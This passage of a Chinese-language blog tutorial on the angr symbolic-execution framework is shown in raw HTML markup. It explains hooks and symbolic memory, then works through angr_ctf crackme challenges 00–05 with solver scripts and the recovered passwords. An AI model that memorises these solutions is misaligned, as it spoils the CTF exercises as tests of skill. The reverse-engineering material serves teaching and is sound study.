punctuation">.</span>solver<span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span>y<span class="token punctuation">)</span><span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>用法：expolre 的 find 地址设置为比较函数的地址，load 的 size 设置为字符串长度，不需要 * 8</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#从地址中加载值</span>res <span class="token operator">=</span> solution_state<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>load<span class="token punctuation">(</span>addr<span class="token punctuation">,</span> size<span class="token punctuation">)</span><span class="token comment">#加入限制：加载值等于固定值</span>solution_state<span class="token punctuation">.</span>solver<span class="token punctuation">.</span>add<span class="token punctuation">(</span>res <span class="token operator">==</span> <span class="token string">'AUPDNNPROEZRJWKB'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h5 id="hook"><a href="#hook" class="headerlink" title="hook"></a>hook</h5><p>可以使用 hook 直接改写函数，hook engine 是 angr 使用的引擎 SimEngine 的子类，默认情况下用 SimProcedures 中的符号摘要替换库函数设置 hooking，可以通过 <code>angr.procedures</code> 或 <code>angr.SimProcedures</code> 查看列表</p><p>SimProcedure 就是 hook 机制，可以通过 <code>project.hook(addr, hook)</code> 设置，其中 hook 是一个 SimProcedure 实例，通过 <code>.is_hooked / .unhook / .hook_py</code> 进行管理，将 <code>project.hook(addr)</code> 作为函数装饰器可以编写自己的 hook 函数，还可以通过 <code>project.hook_symbol(name, hook)</code> hook 函数</p><p>用法：一参是需要 hook 的调用函数的地址，二参是调用函数 <code>call func</code> 到下一条指令之间的长度，函数参数是 state</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> @project<span class="token punctuation">.</span>hook<span class="token punctuation">(</span><span class="token number">0x1234</span><span class="token punctuation">,</span> length<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> <span class="token keyword">def</span> <span class="token function">set_rax</span><span class="token punctuation">(</span>state<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>     state<span class="token punctuation">.</span>regs<span class="token punctuation">.</span>rax <span class="token operator">=</span> <span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>返回值用 <code>claripy.BVV(value, size)</code> ，例如：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">state<span class="token punctuation">.</span>regs<span class="token punctuation">.</span>eax <span class="token operator">=</span> claripy<span class="token punctuation">.</span>If<span class="token punctuation">(</span>            user_input_string <span class="token operator">==</span> check_against_string<span class="token punctuation">,</span>             claripy<span class="token punctuation">.</span>BVV<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> size<span class="token punctuation">)</span><span class="token punctuation">,</span>             claripy<span class="token punctuation">.</span>BVV<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> size<span class="token punctuation">)</span>        <span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="利用函数名hook"><a href="#利用函数名hook" class="headerlink" title="利用函数名hook"></a>利用函数名hook</h5><p>在函数被多次调用的时候利用函数名 hook 而不需要使用函数调用地址</p><p>每个程序都有一个符号表，angr 可以使用 <code>Project.hook_symbol</code> 解析出每个导入符号的地址，用自己的代码替换函数</p><p>用法：<code>project.hook_symbol</code> 一参是函数名，二参是自定义的类，类参数是 <code>angr.SimProcedure</code>，类中定义 run 函数的一参是 self，其他参数可以直接用参数的参数，例如这里 check_equals_symbol 函数有参数 to_check 和 length，加载内存的 state 用 self.state，最后不需要设置 rax 直接 return 即可</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">ReplacementCheckEquals</span><span class="token punctuation">(</span>angr<span class="token punctuation">.</span>SimProcedure<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> to_check<span class="token punctuation">,</span> length<span class="token punctuation">)</span><span class="token punctuation">:</span>            user_input_buffer_address <span class="token operator">=</span> to_check            user_input_buffer_length <span class="token operator">=</span> length            user_input_string <span class="token operator">=</span> self<span class="token punctuation">.</span>state<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>load<span class="token punctuation">(</span>                user_input_buffer_address<span class="token punctuation">,</span>                user_input_buffer_length            <span class="token punctuation">)</span>            check_against_string <span class="token operator">=</span> <span class="token string">'ORSDDWXHZURJRBDH'</span>            <span class="token keyword">return</span> claripy<span class="token punctuation">.</span>If<span class="token punctuation">(</span>                user_input_string <span class="token operator">==</span> check_against_string<span class="token punctuation">,</span>                 claripy<span class="token punctuation">.</span>BVV<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                 claripy<span class="token punctuation">.</span>BVV<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">)</span>            <span class="token punctuation">)</span>        check_equals_symbol <span class="token operator">=</span> <span class="token string">'check_equals_ORSDDWXHZURJRBDH'</span>    project<span class="token punctuation">.</span>hook_symbol<span class="token punctuation">(</span>check_equals_symbol<span class="token punctuation">,</span> ReplacementCheckEquals<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="hook-scanf应对复杂输入"><a href="#hook-scanf应对复杂输入" class="headerlink" title="hook scanf应对复杂输入"></a>hook scanf应对复杂输入</h5><p>用法：调用带有全局状态的 globals 插件，保存对符号值的引用</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">func</span><span class="token punctuation">(</span>angr<span class="token punctuation">.</span>SimProcedure<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> format_string<span class="token punctuation">,</span> param0<span class="token punctuation">,</span> param1<span class="token punctuation">)</span><span class="token punctuation">:</span>        arg1 <span class="token operator">=</span> claripy<span class="token punctuation">.</span>BVS<span class="token punctuation">(</span><span class="token string">'arg1'</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">)</span>        arg2 <span class="token operator">=</span> claripy<span class="token punctuation">.</span>BVS<span class="token punctuation">(</span><span class="token string">'arg2'</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>state<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>store<span class="token punctuation">(</span>param0<span class="token punctuation">,</span> arg1<span class="token punctuation">,</span> endness <span class="token operator">=</span> <span class="token string">'LE'</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>state<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>store<span class="token punctuation">(</span>param1<span class="token punctuation">,</span> arg2<span class="token punctuation">,</span> endness <span class="token operator">=</span> <span class="token string">'LE'</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>state<span class="token punctuation">.</span><span class="token builtin">globals</span><span class="token punctuation">[</span><span class="token string">'solutions'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>arg1<span class="token punctuation">,</span> arg2<span class="token punctuation">)</span>project<span class="token punctuation">.</span>hook_symbol<span class="token punctuation">(</span><span class="token string">'__isoc99_scanf'</span><span class="token punctuation">,</span> func<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token keyword">if</span> simgr<span class="token punctuation">.</span>found<span class="token punctuation">:</span>    solution_state <span class="token operator">=</span> simgr<span class="token punctuation">.</span>found<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    stored_solutions <span class="token operator">=</span> solution_state<span class="token punctuation">.</span><span class="token builtin">globals</span><span class="token punctuation">[</span><span class="token string">'solutions'</span><span class="token punctuation">]</span>    scanf0_solution <span class="token operator">=</span> solution_state<span class="token punctuation">.</span>solver<span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span>stored_solutions<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    scanf1_solution <span class="token operator">=</span> solution_state<span class="token punctuation">.</span>solver<span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span>stored_solutions<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>scanf0_solution<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>scanf1_solution<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="angr-ctf-题解"><a href="#angr-ctf-题解" class="headerlink" title="angr_ctf 题解"></a>angr_ctf 题解</h2><p>项目地址：<a href="https://github.com/jakespringer/angr_ctf">https://github.com/jakespringer/angr_ctf</a></p><h3 id="00-angr-find"><a href="#00-angr-find" class="headerlink" title="00_angr_find"></a>00_angr_find</h3><p>目标地址是输出good job，输出能够到达目标地址的第一个输入</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> angrproject <span class="token operator">=</span> angr<span class="token punctuation">.</span>Project<span class="token punctuation">(</span><span class="token string">'./00_angr_find'</span><span class="token punctuation">)</span>simgr <span class="token operator">=</span> project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>simulation_manager<span class="token punctuation">(</span><span class="token punctuation">)</span>find_address <span class="token operator">=</span> <span class="token number">0x8048675</span>avoid_address <span class="token operator">=</span> <span class="token number">0x8048666</span>simgr<span class="token punctuation">.</span>explore<span class="token punctuation">(</span>find<span class="token operator">=</span>find_address<span class="token punctuation">,</span> avoid<span class="token operator">=</span>avoid_address<span class="token punctuation">)</span><span class="token keyword">if</span> simgr<span class="token punctuation">.</span>found<span class="token punctuation">:</span>    solution_state <span class="token operator">=</span> simgr<span class="token punctuation">.</span>found<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>solution_state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#JXWVXRKX</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="01-angr-avoid"><a href="#01-angr-avoid" class="headerlink" title="01_angr_avoid"></a>01_angr_avoid</h3><p>有很多分支会调用 avoid_me 函数，放到 avoid 参数里</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> angrproject <span class="token operator">=</span> angr<span class="token punctuation">.</span>Project<span class="token punctuation">(</span><span class="token string">'./01_angr_avoid'</span><span class="token punctuation">)</span>simgr <span class="token operator">=</span> project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>simulation_manager<span class="token punctuation">(</span><span class="token punctuation">)</span>find_address <span class="token operator">=</span> <span class="token number">0x80485E0</span>avoid_address <span class="token operator">=</span> <span class="token number">0x80485A8</span>simgr<span class="token punctuation">.</span>explore<span class="token punctuation">(</span>find<span class="token operator">=</span>find_address<span class="token punctuation">,</span> avoid<span class="token operator">=</span>avoid_address<span class="token punctuation">)</span><span class="token keyword">if</span> simgr<span class="token punctuation">.</span>found<span class="token punctuation">:</span>    solution_state <span class="token operator">=</span> simgr<span class="token punctuation">.</span>found<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>solution_state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#HUJOZMYS</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="02-angr-find-condition"><a href="#02-angr-find-condition" class="headerlink" title="02_angr_find_condition"></a>02_angr_find_condition</h3><p>程序中出现多次 Try again 和 Good job，避免记录所有的 Good job地址，将对两种情况的判断写成函数作为 find 和 avoid 的参数</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> angrproject <span class="token operator">=</span> angr<span class="token punctuation">.</span>Project<span class="token punctuation">(</span><span class="token string">'./02_angr_find_condition'</span><span class="token punctuation">)</span>simgr <span class="token operator">=</span> project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>simulation_manager<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">right</span><span class="token punctuation">(</span>state<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token string">b'Good'</span> <span class="token keyword">in</span> state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span><span class="token keyword">def</span> <span class="token function">wrong</span><span class="token punctuation">(</span>state<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token string">b'Try'</span> <span class="token keyword">in</span> state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span>simgr<span class="token punctuation">.</span>explore<span class="token punctuation">(</span>find<span class="token operator">=</span>right<span class="token punctuation">,</span> avoid<span class="token operator">=</span>wrong<span class="token punctuation">)</span><span class="token keyword">if</span> simgr<span class="token punctuation">.</span>found<span class="token punctuation">:</span>    solution_state <span class="token operator">=</span> simgr<span class="token punctuation">.</span>found<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>solution_state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment">#HETOBRCU</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="03-angr-symbolic-registers"><a href="#03-angr-symbolic-registers" class="headerlink" title="03_angr_symbolic_registers"></a>03_angr_symbolic_registers</h3><p>本题使用 scanf 输入了三个十六进制数，angr 对 scanf 的复杂输入处理的不是很好，</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%x %x %x"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v1<span class="token punctuation">,</span> <span class="token operator">&amp;</span>v2<span class="token punctuation">,</span> v3<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>而输入后的参数会传递给寄存器 eax ebx edx</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">.text:08048937                 mov     ecx, [ebp+var_18].text:0804893A                 mov     eax, ecx.text:0804893C                 mov     ecx, [ebp+var_14].text:0804893F                 mov     ebx, ecx.text:08048941                 mov     ecx, [ebp+var_10]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>输入函数返回后通过这三个寄存器传递给栈</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">.text:0804897B                 call    get_user_input.text:08048980                 mov     [ebp+var_14], eax.text:08048983                 mov     [ebp+var_10], ebx.text:08048986                 mov     [ebp+var_C], edx<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>所以可以将三个寄存器符号化注入，从传递寄存器参数给栈的位置开始执行，避开 scanf 输入</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> angr<span class="token keyword">import</span> sys<span class="token keyword">import</span> claripyproject <span class="token operator">=</span> angr<span class="token punctuation">.</span>Project<span class="token punctuation">(</span><span class="token string">'./03_angr_symbolic_registers'</span><span class="token punctuation">)</span>initial_state <span class="token operator">=</span> project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>blank_state<span class="token punctuation">(</span>addr<span class="token operator">=</span><span class="token number">0x8048980</span><span class="token punctuation">)</span>arg1 <span class="token operator">=</span> claripy<span class="token punctuation">.</span>BVS<span class="token punctuation">(</span><span class="token string">'arg1'</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">)</span>arg2 <span class="token operator">=</span> claripy<span class="token punctuation">.</span>BVS<span class="token punctuation">(</span><span class="token string">'arg2'</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">)</span>arg3 <span class="token operator">=</span> claripy<span class="token punctuation">.</span>BVS<span class="token punctuation">(</span><span class="token string">'arg3'</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">)</span>initial_state<span class="token punctuation">.</span>regs<span class="token punctuation">.</span>eax <span class="token operator">=</span> arg1initial_state<span class="token punctuation">.</span>regs<span class="token punctuation">.</span>ebx <span class="token operator">=</span> arg2initial_state<span class="token punctuation">.</span>regs<span class="token punctuation">.</span>edx <span class="token operator">=</span> arg3simgr <span class="token operator">=</span> project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>simulation_manager<span class="token punctuation">(</span>initial_state<span class="token punctuation">)</span><span class="token comment">#simgr = project.factory.simgr(initial_state)</span><span class="token keyword">def</span> <span class="token function">right</span><span class="token punctuation">(</span>state<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token string">b'Good'</span> <span class="token keyword">in</span> state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span><span class="token keyword">def</span> <span class="token function">wrong</span><span class="token punctuation">(</span>state<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token string">b'Try'</span> <span class="token keyword">in</span> state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span>simgr<span class="token punctuation">.</span>explore<span class="token punctuation">(</span>find<span class="token operator">=</span>right<span class="token punctuation">,</span> avoid<span class="token operator">=</span>wrong<span class="token punctuation">)</span><span class="token keyword">if</span> simgr<span class="token punctuation">.</span>found<span class="token punctuation">:</span>    solution_state <span class="token operator">=</span> simgr<span class="token punctuation">.</span>found<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>solution_state<span class="token punctuation">.</span>solver<span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span>arg1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>solution_state<span class="token punctuation">.</span>solver<span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span>arg2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>solution_state<span class="token punctuation">.</span>solver<span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span>arg3<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#0xb9ffd04e</span><span class="token comment">#0xccf63fe8</span><span class="token comment">#0x8fd4d959</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="04-angr-symbolic-stack"><a href="#04-angr-symbolic-stack" class="headerlink" title="04_angr_symbolic_stack"></a>04_angr_symbolic_stack</h3><p>栈符号化，不能直接使用regs，通过计算构造esp和ebp在合适的位置 stack_push 入栈</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> angr<span class="token keyword">import</span> sys<span class="token keyword">import</span> claripyproject <span class="token operator">=</span> angr<span class="token punctuation">.</span>Project<span class="token punctuation">(</span><span class="token string">'./04_angr_symbolic_stack'</span><span class="token punctuation">)</span>initial_state <span class="token operator">=</span> project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>blank_state<span class="token punctuation">(</span>addr<span class="token operator">=</span><span class="token number">0x8048697</span><span class="token punctuation">)</span>arg1 <span class="token operator">=</span> claripy<span class="token punctuation">.</span>BVS<span class="token punctuation">(</span><span class="token string">'arg1'</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">)</span>arg2 <span class="token operator">=</span> claripy<span class="token punctuation">.</span>BVS<span class="token punctuation">(</span><span class="token string">'arg2'</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">)</span>initial_state<span class="token punctuation">.</span>regs<span class="token punctuation">.</span>esp <span class="token operator">=</span> initial_state<span class="token punctuation">.</span>regs<span class="token punctuation">.</span>ebpinitial_state<span class="token punctuation">.</span>regs<span class="token punctuation">.</span>esp <span class="token operator">-=</span> <span class="token number">8</span>initial_state<span class="token punctuation">.</span>stack_push<span class="token punctuation">(</span>arg1<span class="token punctuation">)</span>initial_state<span class="token punctuation">.</span>stack_push<span class="token punctuation">(</span>arg2<span class="token punctuation">)</span>simgr <span class="token operator">=</span> project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>simulation_manager<span class="token punctuation">(</span>initial_state<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">right</span><span class="token punctuation">(</span>state<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token string">b'Good'</span> <span class="token keyword">in</span> state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span><span class="token keyword">def</span> <span class="token function">wrong</span><span class="token punctuation">(</span>state<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token string">b'Try'</span> <span class="token keyword">in</span> state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span>simgr<span class="token punctuation">.</span>explore<span class="token punctuation">(</span>find<span class="token operator">=</span>right<span class="token punctuation">,</span> avoid<span class="token operator">=</span>wrong<span class="token punctuation">)</span><span class="token keyword">if</span> simgr<span class="token punctuation">.</span>found<span class="token punctuation">:</span>    solution_state <span class="token operator">=</span> simgr<span class="token punctuation">.</span>found<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>solution_state<span class="token punctuation">.</span>solver<span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span>arg1<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>solution_state<span class="token punctuation">.</span>solver<span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span>arg2<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment">#1704280884</span><span class="token comment">#2382341151</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="05-angr-symbolic-memory"><a href="#05-angr-symbolic-memory" class="headerlink" title="05_angr_symbolic_memory"></a>05_angr_symbolic_memory</h3><p>主要是用到<code>initial_state.memory.store(addr, arg)</code>，将指定位置的变量符号化</p><p><code>%8s</code> -&gt; 8 字符，一个字符 8 字节，所以长度是 64</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> angr<span class="token keyword">import</span> sys<span class="token keyword">import</span> claripyproject <span class="token operator">=</span> angr<span class="token punctuation">.</span>Project<span class="token punctuation">(</span><span class="token string">'./05_angr_symbolic_memory'</span><span class="token punctuation">)</span>initial_state <span class="token operator">=</span> project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>blank_state<span class="token punctuation">(</span>addr<span class="token operator">=</span><span class="token number">0x8048601</span><span class="token punctuation">)</span>arg1 <span class="token operator">=</span> claripy<span class="token punctuation">.</span>BVS<span class="token punctuation">(</span><span class="token string">'arg1'</span><span class="token punctuation">,</span> <span class="token number">64</span><span class="token punctuation">)</span>arg2 <span class="token operator">=</span> claripy<span class="token punctuation">.</span>BVS<span class="token punctuation">(</span><span class="token string">'arg2'</span><span class="token punctuation">,</span> <span class="token number">64</span><span class="token punctuation">)</span>arg3 <span class="token operator">=</span> claripy<span class="token punctuation">.</span>BVS<span class="token punctuation">(</span><span class="token string">'arg3'</span><span class="token punctuation">,</span> <span class="token number">64</span><span class="token punctuation">)</span>arg4 <span class="token operator">=</span> claripy<span class="token punctuation">.</span>BVS<span class="token punctuation">(</span><span class="token string">'arg4'</span><span class="token punctuation">,</span> <span class="token number">64</span><span class="token punctuation">)</span>addr <span class="token operator">=</span> <span class="token number">0xA1BA1C0</span>initial_state<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>store<span class="token punctuation">(</span>addr<span class="token punctuation">,</span> arg1<span class="token punctuation">)</span>initial_state<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>store<span class="token punctuation">(</span>addr <span class="token operator">+</span> <span class="token number">0x8</span><span class="token punctuation">,</span> arg2<span class="token punctuation">)</span>initial_state<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>store<span class="token punctuation">(</span>addr <span class="token operator">+</span> <span class="token number">0x10</span><span class="token punctuation">,</span> arg3<span class="token punctuation">)</span>initial_state<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>store<span class="token punctuation">(</span>addr <span class="token operator">+</span> <span class="token number">0x18</span><span class="token punctuation">,</span> arg4<span class="token punctuation">)</span>simgr <span class="token operator">=</span> project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>simulation_manager<span class="token punctuation">(</span>initial_state<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">right</span><span class="token punctuation">(</span>state<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token string">b'Good'</span> <span class="token keyword">in</span> state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span><span class="token keyword">def</span> <span class="token function">wrong</span><span class="token punctuation">(</span>state<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token string">b'Try'</span> <span class="token keyword">in</span> state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span>simgr<span class="token punctuation">.</span>explore<span class="token punctuation">(</span>find<span class="token operator">=</span>right<span class="token punctuation">,</span> avoid<span class="token operator">=</span>wrong<span class="token punctuation">)</span><span class="token keyword">if</span> simgr<span class="token punctuation">.</span>found<span 